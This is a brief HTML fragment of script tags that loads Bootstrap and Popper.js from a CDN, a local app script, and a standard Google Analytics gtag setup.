<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
